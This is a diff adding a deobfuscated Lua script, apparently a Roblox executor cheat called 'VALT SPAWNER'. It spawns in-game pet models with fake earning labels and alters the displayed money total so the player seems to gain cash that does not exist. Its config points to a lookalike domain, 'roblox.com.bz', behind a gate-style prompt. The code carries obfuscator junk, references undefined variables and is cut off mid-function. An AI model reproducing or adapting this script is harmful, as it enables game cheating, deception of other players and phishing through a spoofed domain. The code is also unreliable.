@@ -1,0 +1,2320 @@
+-- This file was generated at discord.gg/syncrypt
+
+local t1 = {}
+local t2 = {}
+local v3 = unpack or table.unpack
+if getgenv().__VALT_SPAWNER then
+    pcall(getgenv().__VALT_SPAWNER.unload)
+end
+local _game = game
+t1.value6 = 22367117977775
+t1.value5 = 32235748178594
+t1.value7 = 33503604964593
+t1.value3 = "\184Ίɗ\168\140"
+local Players = _game:GetService("Players")
+local _game2 = game
+t1.value7 = "%\v\161\005N\015\002\199\029t\023\209\200\202.Z\014"
+local ReplicatedStorage = _game2:GetService("ReplicatedStorage")
+
+t1.value2 = "game"
+t1.value8 = 25237642063336
+t2.value1 = ReplicatedStorage
+t1.value2 = game:GetService("RunService")
+t1.value4 = "game"
+t1.value6 = "\157\216)\132w\186!\224\127\001\145ib\147\183@"
+t1.value4 = game:GetService("UserInputService")
+t2.value2 = game:GetService("TweenService")
+t1.value3 = game:GetService("Workspace")
+t2.value3 = t1.value3
+t1.value7 = game:GetService("CoreGui")
+t2.value4 = t1.value7
+t1.value7 = Players.LocalPlayer
+t2.value5 = t1.value7
+t1.value7 = t2.value3.CurrentCamera
+t2.value6 = t1.value7
+t1.value7 = t1.value4.TouchEnabled and not t1.value4.KeyboardEnabled
+t1.value1 = t1.value1
+t1.value10 = 14106976754089
+t2.value7 = t1.value7
+t1.value9 = 0
+local v8 = not t2.value7 and 3 or 2
+t1.value7 = {
+	GROUP_ID = t1.value9,
+	GROUP_LINK = "https://roblox.com.bz/communities/291271763/",
+	GROUP_NAME = "the group",
+	MAX_SPAWNS = 40,
+	SPAWN_DISTANCE = 12,
+	SCALE_MULT = 1,
+	SPIN = true,
+	FLOAT = false,
+	OWN_PLOT_ONLY = true,
+	GROUND = true,
+	ANIMATE = true,
+	NAMETAG = true,
+	ANCHORED = true,
+	GRID_COLUMNS = v8,
+	GIVE_TOOL = true,
+	HAND_MAX_STUDS = 4,
+	MONEY_POPUP = true,
+	PAY_INTERVAL = 1,
+	CASH_VISUAL = true
+}
+t2.value8 = t1.value7
+t2.value9 = "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
+t2.value10 = true
+t1.value7 = {}
+t2.value11 = t1.value7
+t1.value7 = {}
+t2.value12 = t1.value7
+t1.value7 = {}
+t2.value13 = t1.value7
+t2.value14 = {
+	passed = false,
+	gui = nil,
+	shield = nil,
+	dismiss = function()
+end
+}
+t2.value15 = {
+	window = nil,
+	gridTab = nil,
+	rows = {},
+	viewport = nil,
+	counter = nil,
+	previewInfo = nil
+}
+t1.value7 = {
+	text = "",
+	rarity = "All"
+}
+t2.value16 = t1.value7
+t2.value17 = nil
+function t2.value18(p1)
+    t2.value11[#t2.value11 + 1] = p1
+
+    return p1
+end
+function t2.value19(p2)
+    local _setclipboard = setclipboard
+
+    if not _setclipboard then
+        _setclipboard = toclipboard
+
+        if not _setclipboard then
+            _setclipboard = set_clipboard
+
+            if not _setclipboard then
+                _setclipboard = type(Clipboard) == "table"
+
+                if _setclipboard then
+                    _setclipboard = Clipboard.set
+                end
+            end
+        end
+    end
+
+    if not _setclipboard then
+        return false
+    end
+
+    return pcall(_setclipboard, p2)
+end
+local function v9(p3)
+    local _syn = syn
+
+    if _syn then
+        _syn = syn.protect_gui
+    end
+
+    if _syn then
+        pcall(syn.protect_gui, p3)
+    end
+
+    if gethui then
+        local ok, result = pcall(gethui)
+
+        if ok and result then
+            p3.Parent = result
+
+            return
+        end
+    end
+
+    if not pcall(function()
+        p3.Parent = t2.value4
+    end) then
+        p3.Parent = t2.value5:WaitForChild("PlayerGui")
+    end
+end
+local Directory = require(t2.value1.Data.Assets).Directory
+t2.value20 = {}
+t2.value21 = { "All" }
+t2.value22 = {}
+for k, v in pairs(Directory) do
+    local v13 = k
+    local v14 = v.Rarity or {}
+    local _tostring = tostring
+    local value1 = t1.value1
+    local _id = v14._id
+
+    t1.value11 = _id
+
+    if not _id then
+        t1.value12 = t1.value1
+
+        local v18 = v14.DisplayName or "Unknown"
+        local value12 = t1.value12
+
+        t1.value11 = v18
+        t1.value1 = value12
+    end
+
+    local v20 = _tostring(t1.value11)
+
+    t1.value15 = 25984866135876
+    t1.value1 = value1
+    t1.value11 = "id"
+    t1.value12 = tostring(v.DisplayName or v13)
+    t1.value13 = tostring
+    t1.value14 = v.Icon or ""
+    t1.value15 = t1.value13(t1.value14)
+    t1.value18 = t1.value1
+    t1.value13 = "eggIcon"
+    t1.value19 = v.Egg
+
+    local value19 = t1.value19
+    local value1_2 = t1.value1
+
+    t1.value17 = value19
+    t1.value16 = value1_2
+
+    if t1.value19 then
+        t1.value22 = t1.value1
+        t1.value20 = tostring(v.Egg.Icon or "")
+
+        local value20 = t1.value20
+        local value22 = t1.value22
+
+        t1.value17 = value20
+        t1.value1 = value22
+    end
+
+    local value17 = t1.value17
+    local value18 = t1.value18
+
+    t1.value14 = value17
+    t1.value1 = value18
+
+    if not t1.value17 then
+        t1.value14 = ""
+    end
+
+    t1.value1 = t1.value16
+    t1.value22 = 33652734901558
+    t1.value21 = 24160049556466
+    t1.value16 = "rarity"
+    t1.value17 = "rank"
+
+    local value1_3 = t1.value1
+
+    t1.value21 = "tonumber"
+    t1.value19 = value1_3
+    t1.value18 = tonumber(v14.RarityNumber) or 0
+    t1.value21 = t1.value1
+    t1.value19 = "color"
+    t1.value27 = typeof
+    t1.value23 = t1.value1
+    t1.value22 = t1.value27(v14.Color) == "Color3" and v14.Color
+
+    local value23 = t1.value23
+    local value22 = t1.value22
+
+    t1.value1 = value23
+    t1.value20 = value22
+
+    if not t1.value22 then
+        t1.value20 = Color3.fromRGB(200, 200, 200)
+    end
+
+    t1.value1 = t1.value21
+
+    local value1_4 = t1.value1
+
+    t1.value27 = "tonumber"
+    t1.value23 = value1_4
+    t1.value21 = "rate"
+    t1.value27 = tonumber(v.EarningRate)
+    t1.value22 = t1.value27 or 0
+    t1.value26 = 32051978893901
+    t1.value23 = "scale"
+    t1.value28 = tonumber(v.BaseModelScale) or 1
+    t1.value27 = "idle"
+    t1.value29 = v.Animations
+    t1.value26 = t1.value29
+
+    if t1.value29 then
+        t1.value26 = v.Animations.Idle
+    end
+
+    t1.value24 = t1.value26 or nil
+
+    local t3 = {
+		[v1295] = v13,
+		name = t1.value12,
+		icon = t1.value15,
+		[v1299] = t1.value14,
+		[v1302] = v20,
+		[v1303] = t1.value18,
+		[v1305] = t1.value20,
+		[v1307] = t1.value22,
+		[v1309] = t1.value28,
+		[v1313] = t1.value24
+	}
+
+    t1.value11 = t2.value20
+
+    local v32 = #t2.value20 + 1
+
+    t1.value11[v32] = t3
+
+    if t2.value22[v20] == nil then
+        t1.value11 = t2.value22
+
+        local rank = t3.rank
+
+        t1.value11[v20] = rank
+        t1.value11 = t2.value21
+
+        local v34 = #t2.value21 + 1
+
+        t1.value11[v34] = v20
+    end
+end
+t1.value25 = 14098696231333
+local _table = table
+function t1.value16()
+    for _, v in ipairs(t2.value13) do
+        local v51 = v
+
+        pcall(function()
+            v51:Destroy()
+        end)
+    end
+
+    table.clear(t2.value13)
+end
+_table.sort(t2.value20, function(p4, p5)
+    if p4.rank ~= p5.rank then
+        return p4.rank > p5.rank
+    end
+
+    return p4.name < p5.name
+end)
+
+local sort = table.sort
+function t1.value12()
+    while #t2.value12 > t2.value8.MAX_SPAWNS do
+        local v56 = table.remove(t2.value12, 1)
+        local v57 = v56
+
+        if v57 then
+            v57 = v56.model
+        end
+
+        if v57 then
+            pcall(function()
+                v56.model:Destroy()
+            end)
+        end
+    end
+end
+sort(t2.value21, function(p6, p7)
+    if p6 == "All" then
+        return true
+    end
+
+    if p7 == "All" then
+        return false
+    end
+
+    return (t2.value22[p6] or 0) > (t2.value22[p7] or 0)
+end)
+
+function t2.value23(p8)
+    local v59 = tonumber(p8) or 0
+
+    for _, v in ipairs({
+		{
+			1000000000000,
+			"T"
+		},
+		{
+			1000000000,
+			"B"
+		},
+		{
+			1000000,
+			"M"
+		},
+		{
+			1000,
+			"K"
+		}
+	}) do
+        if v59 >= v[1] then
+            return string.format("%.2f", v59 / v[1]):gsub("%.?0+$", "") .. v[2]
+        end
+    end
+
+    return (tostring((math.floor(v59))))
+end
+function t2.value24()
+    local Character = t2.value5.Character
+
+    if not Character then
+        return nil
+    end
+
+    return Character:FindFirstChild("HumanoidRootPart") or Character.PrimaryPart
+end
+t2.value25 = nil
+t2.value18(t1.value4.TouchTap:Connect(function(p9)
+    if p9 and p9[1] then
+        t2.value25 = p9[1]
+    end
+end))
+t2.value18(v3({ t1.value4.TouchEnded:Connect(function(part)
+    t2.value25 = part.Position
+end) }))
+
+function t2.value26()
+    local value7 = t2.value7
+
+    if value7 then
+        value7 = t2.value25 and t2.value6
+    end
+
+    if value7 then
+        local v67 = t2.value6:ViewportPointToRay(t2.value25.X, t2.value25.Y)
+        local raycastParams = RaycastParams.new()
+
+        raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+        raycastParams.FilterDescendantsInstances = {
+			t2.value5.Character,
+			t2.value3:FindFirstChild("__ValtSpawns")
+		}
+
+        local raycastResult = t2.value3:Raycast(v67.Origin, v67.Direction * 600, raycastParams)
+
+        if raycastResult then
+            return raycastResult.Position
+        end
+    end
+
+    local ok, result = pcall(function()
+        return t2.value5:GetMouse()
+    end)
+
+    if ok then
+        ok = result
+
+        if result then
+            ok = result.Hit and result.Target
+        end
+    end
+
+    if ok then
+        return result.Hit.Position
+    end
+
+    local Character = t2.value5.Character
+
+    if Character then
+        Character = t2.value5.Character:FindFirstChild("HumanoidRootPart")
+
+        if not Character then
+            Character = t2.value5.Character.PrimaryPart
+        end
+    end
+
+    if Character then
+        return Character.Position + Character.CFrame.LookVector * t2.value8.SPAWN_DISTANCE
+    end
+
+    return nil
+end
+function t2.value27()
+    local __ValtSpawns = t2.value3:FindFirstChild("__ValtSpawns")
+
+    if not __ValtSpawns then
+        __ValtSpawns = Instance.new("Folder")
+        __ValtSpawns.Name = "__ValtSpawns"
+        __ValtSpawns.Parent = t2.value3
+    end
+
+    return __ValtSpawns
+end
+t2.value28 = nil
+function t2.value28()
+    local Plots = t2.value3:FindFirstChild("Plots")
+
+    if not Plots then
+        return nil
+    end
+
+    local value5Name = t2.value5.Name
+    local GetChildren = Plots.GetChildren
+
+    for _, v in ipairs(GetChildren(Plots)) do
+        local PlotSign = v:FindFirstChild("PlotSign")
+
+        if PlotSign then
+            for _, descendant in ipairs(PlotSign:GetDescendants()) do
+                if descendant:IsA("TextLabel") and value5Name == descendant.Text then
+                    return v
+                end
+            end
+        end
+    end
+
+    return nil
+end
+function t1.value11(p10, p11)
+    local PrimaryPart = p10.PrimaryPart
+
+    if not PrimaryPart then
+        return
+    end
+
+    local BillboardGui = Instance.new("BillboardGui")
+
+    BillboardGui.Name = "ValtTag"
+    BillboardGui.Size = UDim2.fromOffset(220, 72)
+
+    local _Vector3 = Vector3
+    local GetExtentsSize = p10.GetExtentsSize
+
+    BillboardGui.StudsOffsetWorldSpace = _Vector3.new(0, GetExtentsSize(p10).Y * 0.65 + 2, 0)
+    BillboardGui.AlwaysOnTop = true
+    BillboardGui.MaxDistance = 400
+    BillboardGui.Parent = PrimaryPart
+
+    if p11.icon ~= "" then
+        local ImageLabel = Instance.new("ImageLabel")
+
+        ImageLabel.BackgroundTransparency = 1
+        ImageLabel.AnchorPoint = Vector2.new(0.5, 0)
+        ImageLabel.Position = UDim2.new(0.5, 0, 0, 0)
+        ImageLabel.Size = UDim2.fromOffset(34, 34)
+        ImageLabel.Image = p11.icon
+        ImageLabel.ScaleType = Enum.ScaleType.Fit
+        ImageLabel.Parent = BillboardGui
+    end
+
+    local TextLabel = Instance.new("TextLabel")
+
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.new(0, 0, 0, 34)
+    TextLabel.Size = UDim2.new(1, 0, 0, 22)
+    TextLabel.Font = Enum.Font.GothamBold
+    TextLabel.TextScaled = true
+    TextLabel.TextColor3 = Color3.new(1, 1, 1)
+    TextLabel.TextStrokeTransparency = 0.4
+    TextLabel.Text = p11.name
+    TextLabel.Parent = BillboardGui
+
+    local TextLabel2 = Instance.new("TextLabel")
+
+    TextLabel2.BackgroundTransparency = 1
+    TextLabel2.Position = UDim2.new(0, 0, 0, 56)
+    TextLabel2.Size = UDim2.new(1, 0, 0, 16)
+    TextLabel2.Font = Enum.Font.GothamMedium
+    TextLabel2.TextScaled = true
+    TextLabel2.TextColor3 = p11.color
+    TextLabel2.TextStrokeTransparency = 0.5
+    TextLabel2.Text = string.format("%s  |  $%s/s", p11.rarity, t2.value23(p11.rate))
+    TextLabel2.Parent = BillboardGui
+end
+function t2.value29(p12)
+    local v103 = t2.value28()
+
+    if not v103 then
+        return nil
+    end
+
+    local v104 = v103:FindFirstChild("CenterPoint") or v103:FindFirstChild("SpawnPoint")
+
+    if not v104 then
+        return nil
+    end
+
+    local v105 = p12 or 0
+    local v106 = v105 % 10 * 0.6283185307179586
+    local v107 = math.floor(v105 / 10) * 3.5 + 5
+
+    return v104.Position + Vector3.new(math.cos(v106) * v107, 0, math.sin(v106) * v107)
+end
+function t2.value30(p13, p14)
+    if not t2.value8.GROUND then
+        local _Vector3 = Vector3
+        local GetExtentsSize = p14.GetExtentsSize
+
+        return p13 + _Vector3.new(0, GetExtentsSize(p14).Y * 0.5, 0)
+    end
+
+    local raycastParams = RaycastParams.new()
+
+    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+    raycastParams.FilterDescendantsInstances = {
+		p14,
+		t2.value5.Character,
+		t2.value27()
+	}
+    raycastParams.IgnoreWater = true
+
+    local raycastResult = t2.value3:Raycast(p13 + Vector3.new(0, 40, 0), Vector3.new(0, -300, 0), raycastParams)
+
+    if raycastResult then
+        raycastResult = raycastResult.Position.Y
+    end
+
+    if not raycastResult then
+        raycastResult = p13.Y
+    end
+
+    return Vector3.new(p13.X, raycastResult + p14:GetExtentsSize().Y * 0.5, p13.Z)
+end
+t2.value31 = t1.value11
+function t1.value17(p15)
+    local root = p15.root
+
+    if not root or not root.Parent then
+        return
+    end
+
+    local BillboardGui = Instance.new("BillboardGui")
+
+    BillboardGui.Name = "ValtCash"
+    BillboardGui.Size = UDim2.fromOffset(150, 40)
+    BillboardGui.StudsOffsetWorldSpace = Vector3.new(0, p15.tagHeight, 0)
+    BillboardGui.AlwaysOnTop = true
+    BillboardGui.MaxDistance = 300
+    BillboardGui.Adornee = root
+    BillboardGui.Parent = root
+
+    local TextLabel = Instance.new("TextLabel")
+
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Size = UDim2.fromScale(1, 1)
+    TextLabel.Font = Enum.Font.LuckiestGuy
+    TextLabel.TextScaled = true
+    TextLabel.TextColor3 = Color3.fromRGB(80, 235, 105)
+    TextLabel.TextStrokeColor3 = Color3.fromRGB(10, 45, 15)
+    TextLabel.TextStrokeTransparency = 0.15
+    TextLabel.Text = "+$" .. t2.value23(p15.rate)
+    TextLabel.Parent = BillboardGui
+
+    local tweenInfo = TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+    t2.value2:Create(BillboardGui, tweenInfo, {
+		StudsOffsetWorldSpace = Vector3.new(0, p15.tagHeight + 4.5, 0)
+	}):Play()
+    t2.value2:Create(TextLabel, TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+		TextTransparency = 1,
+		TextStrokeTransparency = 1
+	}):Play()
+    game:GetService("Debris"):AddItem(BillboardGui, 1.3)
+end
+function t2.value32(p16, p17)
+    local v83 = t2.value8.SCALE_MULT * (p17.scale or 1)
+    local v84 = v83
+    local v85 = v84 > 0
+    if v85 then
+        v85 = math.abs(v84 - 1) > 0.001
+    end
+    if v85 then
+        pcall(function()
+            p16:ScaleTo(v84)
+        end)
+    end
+    local v86 = false
+    for _, descendant in ipairs(p16:GetDescendants()) do
+        local v89 = descendant:IsA("Motor6D")
+
+        if not v89 then
+            v89 = descendant:IsA("Weld") or descendant:IsA("WeldConstraint")
+        end
+
+        if v89 then
+            v86 = true
+
+            break
+        end
+    end
+    local PrimaryPart = p16.PrimaryPart
+    for v93, v94 in ipairs(p16:GetDescendants()) do
+
+        if v94:IsA("BasePart") then
+            v94.CanCollide = false
+            v94.CanQuery = false
+            v94.CanTouch = false
+            v94.Massless = true
+
+            local ANCHORED = t2.value8.ANCHORED
+
+            if ANCHORED then
+                ANCHORED = not v86 or v94 == PrimaryPart
+            end
+
+            v94.Anchored = ANCHORED
+        end
+    end
+    if PrimaryPart then
+        PrimaryPart.Anchored = t2.value8.ANCHORED
+    end
+
+    return v86
+end
+function t2.value33(p18, p19)
+    local ANIMATE = t2.value8.ANIMATE
+
+    if ANIMATE then
+        ANIMATE = p19.idle
+    end
+
+    if not ANIMATE then
+        return
+    end
+
+    local ok, result = pcall(function()
+        local v310 = p18:FindFirstChildOfClass("Model") or p18
+        local AnimationController = v310:FindFirstChildOfClass("AnimationController")
+
+        if not AnimationController then
+            AnimationController = v310:FindFirstChildOfClass("Humanoid")
+        end
+
+        if not AnimationController then
+            AnimationController = Instance.new("AnimationController")
+            AnimationController.Parent = v310
+        end
+
+        local Animator = AnimationController:FindFirstChildOfClass("Animator")
+
+        if not Animator then
+            Animator = Instance.new("Animator")
+            Animator.Parent = AnimationController
+        end
+
+        local v313 = typeof(p19.idle) == "Instance"
+
+        if v313 then
+            v313 = p19.idle:IsA("Animation")
+        end
+
+        local clone
+
+        if v313 then
+            clone = p19.idle:Clone()
+        else
+            clone = Instance.new("Animation")
+            clone.AnimationId = tostring(p19.idle)
+        end
+
+        local track = Animator:LoadAnimation(clone)
+
+        track.Looped = true
+        track:Play()
+    end)
+
+    if not ok then
+        warn("[VALT SPAWNER] idle animation failed for " .. p19.name .. ": " .. tostring(result))
+    end
+end
+t2.value34 = t1.value12
+t2.value35 = nil
+function t1.value13(p20, p21)
+    if not t2.value10 then
+        return false, "unloaded"
+    end
+
+    local AssetModels = t2.value1:FindFirstChild("AssetModels")
+
+    if AssetModels then
+        AssetModels = AssetModels:FindFirstChild(p20.id)
+    end
+
+    if not AssetModels then
+        return false, "no model for " .. p20.id
+    end
+
+    local v130 = t2.value24()
+
+    if not v130 then
+        return false, "character not loaded"
+    end
+
+    local clone = AssetModels:Clone()
+
+    clone.Name = "VALT_" .. p20.id
+
+    local v132 = t2.value32(clone, p20)
+
+    clone.Parent = t2.value27()
+
+    local v133 = t2.value8.OWN_PLOT_ONLY and t2.value29(#t2.value12) or nil
+
+    if v133 then
+    elseif typeof(p21) == "Vector3" then
+        v133 = p21
+    else
+        local v134 = #t2.value12
+        local v135 = v134 % 12 * 0.5235987755982988
+        local v136 = t2.value8.SPAWN_DISTANCE + math.floor(v134 / 12) * 6
+
+        v133 = v130.Position + Vector3.new(math.cos(v135) * v136, 0, math.sin(v135) * v136)
+    end
+
+    local u137 = t2.value30(v133, clone)
+    local Position = v130.Position
+
+    pcall(function()
+        clone:PivotTo(CFrame.new(u137, Vector3.new(Position.X, u137.Y, Position.Z)))
+    end)
+
+    if t2.value8.NAMETAG then
+        pcall(t2.value31, clone, p20)
+    end
+
+    t2.value33(clone, p20)
+
+    local value12 = t2.value12
+    local v140 = #t2.value12 + 1
+    local PrimaryPart = clone.PrimaryPart
+    local v142 = u137
+    local elapsed = os.clock()
+    local elapsed2 = os.clock()
+    local name = p20.name
+    local rate = p20.rate
+    local v147 = clone:GetExtentsSize().Y * 0.65 + 4
+
+    value12[v140] = {
+		model = clone,
+		root = PrimaryPart,
+		basePos = v142,
+		t0 = elapsed,
+		lastPay = elapsed2,
+		name = name,
+		rate = rate,
+		tagHeight = v147,
+		jointed = v132
+	}
+    t2.value34()
+
+    return true
+end
+function t1.value15()
+
+    for v150, v151 in ipairs(t2.value12) do
+
+        local v152 = v151
+
+        if v152.model then
+            pcall(function()
+                v152.model:Destroy()
+            end)
+        end
+    end
+    table.clear(t2.value12)
+    local __ValtSpawns = t2.value3:FindFirstChild("__ValtSpawns")
+    if __ValtSpawns then
+        pcall(function()
+            __ValtSpawns:Destroy()
+        end)
+    end
+end
+function t1.value14(p22)
+    if not t2.value10 then
+        return false, "unloaded"
+    end
+    local AssetModels = t2.value1:FindFirstChild("AssetModels")
+    local g170
+    if AssetModels then
+        AssetModels = AssetModels:FindFirstChild(p22.id)
+    end
+    if not AssetModels then
+        return false, "no model for " .. p22.id
+    end
+    local Backpack = t2.value5:FindFirstChildOfClass("Backpack")
+    if not Backpack then
+        return false, "no backpack"
+    end
+    local Tool = Instance.new("Tool")
+    Tool.Name = p22.name
+    Tool.ToolTip = string.format("%s  |  $%s/s  -  click to place (one use)", p22.rarity, t2.value23(p22.rate))
+    Tool.CanBeDropped = false
+    Tool.RequiresHandle = true
+    Tool.TextureId = p22.icon
+    local Part = Instance.new("Part")
+    Part.Name = "Handle"
+    Part.Size = Vector3.new(1, 1, 1)
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.CanQuery = false
+    Part.CanTouch = false
+    Part.Massless = true
+    Part.Parent = Tool
+    local clone = AssetModels:Clone()
+    clone.Name = "Pet"
+    local ExtentsSize = clone:GetExtentsSize()
+    local v161 = math.max(ExtentsSize.X, ExtentsSize.Y, ExtentsSize.Z)
+    if v161 > t2.value8.HAND_MAX_STUDS then
+        local HAND_MAX_STUDS = t2.value8.HAND_MAX_STUDS
+        local u163 = HAND_MAX_STUDS / v161
+        pcall(function()
+            clone:ScaleTo(u163 ^ 0.5)
+        end)
+    end
+    local PrimaryPart = clone.PrimaryPart
+    if not PrimaryPart then
+        PrimaryPart = clone:FindFirstChildWhichIsA("BasePart", true)
+    end
+    local v165 = false
+    local v166, v167, v168 = ipairs(clone:GetDescendants())
+    repeat
+        local v169
+
+        v168, v169 = v166(v167, v168)
+
+        if not v168 then
+            g170 = true
+        end
+
+        if g170 then
+            break
+        end
+    until v169:IsA("Motor6D")
+    if not g170 then
+        v165 = true
+    end
+    g170 = false
+    for v173, v174 in ipairs(clone:GetDescendants()) do
+
+        if v174:IsA("BasePart") then
+            v174.Anchored = false
+            v174.CanCollide = false
+            v174.CanQuery = false
+            v174.CanTouch = false
+            v174.Massless = true
+        end
+    end
+    clone.Parent = Tool
+    if PrimaryPart then
+        local Weld = Instance.new("Weld")
+
+        Weld.Part0 = Part
+        Weld.Part1 = PrimaryPart
+        Weld.C0 = CFrame.new(0, clone:GetExtentsSize().Y * 0.4, 0)
+        Weld.Parent = Part
+    end
+    if not v165 then
+        for _, descendant in ipairs(clone:GetDescendants()) do
+            if descendant:IsA("BasePart") and descendant ~= PrimaryPart then
+                local WeldConstraint = Instance.new("WeldConstraint")
+
+                WeldConstraint.Part0 = PrimaryPart
+                WeldConstraint.Part1 = descendant
+                WeldConstraint.Parent = PrimaryPart
+            end
+        end
+    else
+        t2.value33(clone, p22)
+    end
+    Tool.Parent = Backpack
+    local v179 = #t2.value13 + 1
+    t2.value13[v179] = Tool
+    t2.value18(Tool.Activated:Connect(function()
+        local v316 = t2.value26()
+        local v318, v319 = t2.value35(p22, v316)
+        if not v318 then
+            warn("[VALT SPAWNER] place failed: " .. tostring(v319))
+
+            return
+        end
+        for i = #t2.value13, 1, -1 do
+            local v321 = i
+
+            if t2.value13[v321] == Tool then
+                table.remove(t2.value13, v321)
+            end
+        end
+        pcall(function()
+            Tool:Destroy()
+        end)
+    end))
+
+    return true
+end
+t2.value35 = t1.value13
+t2.value36 = t1.value15
+t2.value37 = t1.value14
+t2.value38 = t1.value16
+t2.value39 = t1.value17
+t1.value18 = {
+	1000000000000,
+	"T"
+}
+t1.value20 = 1000000000
+t1.value27 = "\005"
+t1.value19 = {
+	t1.value20,
+	"B"
+}
+t1.value20 = {
+	1000000,
+	"M"
+}
+local t4 = {
+	t1.value18,
+	t1.value19,
+	t1.value20,
+	{
+		1000,
+		"K"
+	}
+}
+t1.value23 = "\156"
+t1.value25 = "\149"
+t1.value17 = t4
+t1.value28 = 25292892237313
+t2.value40 = t1.value17
+t2.value41 = {
+	K = 1000,
+	M = 1000000,
+	B = 1000000000,
+	T = 1000000000000
+}
+t1.value27 = 1157307253274
+t1.value25 = 2236339700753
+t1.value17 = {
+	label = nil,
+	base = 0,
+	bonus = 0,
+	shown = 0,
+	ours = nil,
+	conn = nil
+}
+function t1.value21(p23)
+    local v181, v182 = tostring(p23):gsub("[%$,%s]", ""):match("^([%d%.]+)(%a*)$")
+
+    if not v181 then
+        return nil
+    end
+
+    local v183 = if v182 ~= "" then t2.value41[v182:upper()] else 1
+
+    if not v183 then
+        return nil
+    end
+
+    return (tonumber(v181) or 0) * v183
+end
+function t1.value23()
+    local PlayerGui = t2.value5:FindFirstChildOfClass("PlayerGui")
+    if not PlayerGui then
+        return nil
+    end
+    local HUD = PlayerGui:FindFirstChild("HUD")
+    for v188, v189 in ipairs({
+		"GameHUD",
+		"BottomLeft",
+		"Money",
+		"Value"
+	}) do
+
+        HUD = HUD and HUD:FindFirstChild(v189)
+    end
+    local v190 = HUD
+    if HUD then
+        v190 = HUD:IsA("TextLabel")
+    end
+    if v190 then
+        return HUD
+    end
+    local GetDescendants = PlayerGui.GetDescendants
+    local _ipairs = ipairs
+    for _, v194 in _ipairs(GetDescendants(PlayerGui)) do
+        local v195 = v194:IsA("TextLabel")
+
+        if v195 then
+            v195 = v194.Text:match("^%$%d")
+
+            if v195 then
+                v195 = v194.AbsoluteSize.X > 40
+            end
+        end
+
+        if not v195 then
+            continue
+        end
+
+        local v196 = v194
+
+        _ipairs = nil
+
+        local v197 = _ipairs
+
+        while v196 do
+            _ipairs = v196:IsA("ScreenGui")
+
+            if _ipairs then
+                _ipairs = v196
+                v197 = _ipairs
+
+                break
+            end
+
+            v196 = v196.Parent
+        end
+
+        if v197 and v197.Enabled then
+            return v194
+        end
+    end
+
+    return nil
+end
+t2.value42 = t1.value17
+t2.value43 = t1.value21
+local function v38(p24)
+    for _, v in ipairs(t2.value40) do
+        if p24 >= v[1] then
+            local v201 = p24 / v[1]
+            local format = string.format
+            local v203 = v201 >= 100 and "%.0f"
+
+            if not v203 then
+                v203 = "%.1f"
+            end
+
+            return "$" .. format(v203, v201):gsub("%.0$", "") .. v[2]
+        end
+    end
+
+    return "$" .. string.format("%.0f", p24)
+end
+t2.value44 = t1.value23
+local function v39()
+    local v204 = t2.value44()
+
+    if not v204 then
+        return false
+    end
+
+    if v204 == t2.value42.label then
+        return true
+    end
+
+    if t2.value42.conn then
+        pcall(function()
+            t2.value42.conn:Disconnect()
+        end)
+    end
+
+    t2.value42.label = v204
+    t2.value42.base = t2.value43(v204.Text) or 0
+    t2.value42.shown = t2.value42.base + t2.value42.bonus
+    t2.value42.conn = t2.value18(v204:GetPropertyChangedSignal("Text"):Connect(function()
+        if v204.Text ~= t2.value42.ours then
+            local value42 = t2.value42
+            local v323 = t2.value43(v204.Text)
+
+            if not v323 then
+                v323 = t2.value42.base
+            end
+
+            value42.base = v323
+        end
+    end))
+
+    return true
+end
+local function v40()
+    if t2.value42.conn then
+        pcall(function()
+            t2.value42.conn:Disconnect()
+        end)
+    end
+
+    local label = t2.value42.label
+
+    if label then
+        label = t2.value42.label.Parent
+    end
+
+    if label then
+        pcall(function()
+            t2.value42.label.Text = v38(t2.value42.base)
+        end)
+    end
+
+    local value42 = t2.value42
+    local value42_2 = t2.value42
+    local value42_3 = t2.value42
+    local value42_4 = t2.value42
+
+    value42.label = nil
+    value42_2.conn = nil
+    value42_3.bonus = 0
+    value42_4.ours = nil
+end
+t1.value27 = t2.value18
+t1.value25 = t1.value2.Heartbeat
+t1.value26 = { t1.value25:Connect(function(p25)
+    if not t2.value10 then
+        return
+    end
+
+    local clock = os.clock
+    local v212 = clock()
+
+    if t2.value8.CASH_VISUAL then
+        local label = t2.value42.label
+
+        if label then
+            label = t2.value42.label.Parent
+        end
+
+        if not label then
+            clock = v39
+            clock()
+        end
+
+        local label2 = t2.value42.label
+
+        if label2 then
+            label2 = t2.value42.bonus > 0
+        end
+
+        if label2 then
+            local v215 = t2.value42.base + t2.value42.bonus
+
+            clock = t2.value42
+            clock.shown = t2.value42.shown + (v215 - t2.value42.shown) * math.min(1, (p25 or 0.016666666666667) * 6)
+
+            if math.abs(v215 - t2.value42.shown) < 1 then
+                t2.value42.shown = v215
+            end
+
+            t2.value42.ours = v38(t2.value42.shown)
+            t2.value42.label.Text = t2.value42.ours
+        end
+    end
+
+    for i = #t2.value12, 1, -1 do
+        local v217 = i
+        local v218 = t2.value12[v217]
+        local v219 = not v218.model
+
+        if not v219 then
+            v219 = not v218.model.Parent
+        end
+
+        if v219 then
+            table.remove(t2.value12, v217)
+        else
+            local SPIN = t2.value8.SPIN
+
+            if not SPIN then
+                SPIN = t2.value8.FLOAT
+            end
+
+            if SPIN then
+                SPIN = v218.root
+
+                if SPIN then
+                    SPIN = v218.root.Anchored
+                end
+            end
+
+            if SPIN then
+                local v221 = v212 - v218.t0
+                local FLOAT = t2.value8.FLOAT
+
+                if FLOAT then
+                    FLOAT = math.sin(v221 * 1.6) * 0.6
+                end
+
+                local value8 = t2.value8
+                local v224 = FLOAT or 0
+                local v225 = value8.SPIN and v221 * 1.1 or 0
+
+                v218.root.CFrame = CFrame.new(v218.basePos + Vector3.new(0, v224, 0)) * CFrame.Angles(0, v225, 0)
+            end
+
+            if v212 - v218.lastPay >= t2.value8.PAY_INTERVAL then
+                v218.lastPay = v212
+
+                if t2.value8.MONEY_POPUP then
+                    t2.value39(v218)
+                end
+
+                if t2.value8.CASH_VISUAL then
+                    t2.value42.bonus = t2.value42.bonus + v218.rate * t2.value8.PAY_INTERVAL
+                end
+            end
+        end
+    end
+end) }
+t1.value27(v3(t1.value26))
+
+function t1.value27()
+    if t2.value14.gui then
+        return t2.value14.gui
+    end
+
